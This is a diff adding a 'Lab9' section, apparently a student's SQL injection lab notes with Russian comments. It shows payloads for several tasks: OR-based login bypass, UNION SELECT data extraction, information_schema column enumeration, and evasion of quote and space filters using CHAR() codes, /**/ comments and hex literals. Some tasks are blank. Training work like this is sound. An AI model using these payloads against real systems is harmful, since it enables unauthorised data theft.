@@ -1649,3 +1649,75 @@ SELECT [DateOfBirth] FROM Persons
 | 1992-08-12 |
 
 
+Lab9
+
+№1
+```tsql
+-- Обычный запрос на выборку таблицы
+SELECT * FROM users
+```
+
+![1](https://github.com/user-attachments/assets/d8574bed-3da6-4739-8381-d9a31f9a353c)
+
+№2
+```tsql
+' OR id=9 #
+```
+
+![Решение](https://github.com/user-attachments/assets/afc41efd-4aea-440f-a370-a05a346dc08d)
+
+№3
+```tsql
+# TODO: скрин утерян
+```
+
+
+
+№4
+```tsql
+' UNION SELECT * FROM secret WHERE ggg='abc' # 
+```
+
+![Решение](https://github.com/user-attachments/assets/ef6248a9-53db-424d-aab1-4303f9881930)
+
+№5
+```tsql
+-- Используем обращение к системной схеме для получения названий столбцов в таблице secret - dfgfddfgdfdfdf и dfgdfgfdg
+' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='secret' # 
+```
+
+![Шаг1](https://github.com/user-attachments/assets/588738da-dc3b-4c09-bbc7-48bc40cc5c8e)
+
+
+```tsql
+-- Получаем данные из таблицы secret
+' UNION SELECT 1, dfgfddfgdfdfdf, dfgdfgfdg FROM secret # 
+```
+
+![image](https://github.com/user-attachments/assets/e971fc2a-4bf7-4905-a0fc-e484f1ec4252)
+
+№6
+```tsql
+-- CHAR(103,111,100) - это ASCII коды для символов 'g', 'o' и 'd', что может обойти фильтрацию кавычек. 0 для того, чтобы убрать записи из первой части условия
+0 OR login=CHAR(103,111,100)
+```
+
+![image](https://github.com/user-attachments/assets/dd50aada-1190-4414-83d0-cdff8453836e)
+
+№7
+```tsql
+-- С помощью блоков комментариев /**/ обходим запрет на использование пробелов. 0x2567656e746f6f25 - hex код искомой подстроки
+0/**/or/**/login/**/like/**/0x2567656e746f6f25
+```
+
+![image](https://github.com/user-attachments/assets/376a811d-f48d-4afd-acea-6f48c3529c5f)
+
+№8
+
+
+
+№9
+
+
+
+№10
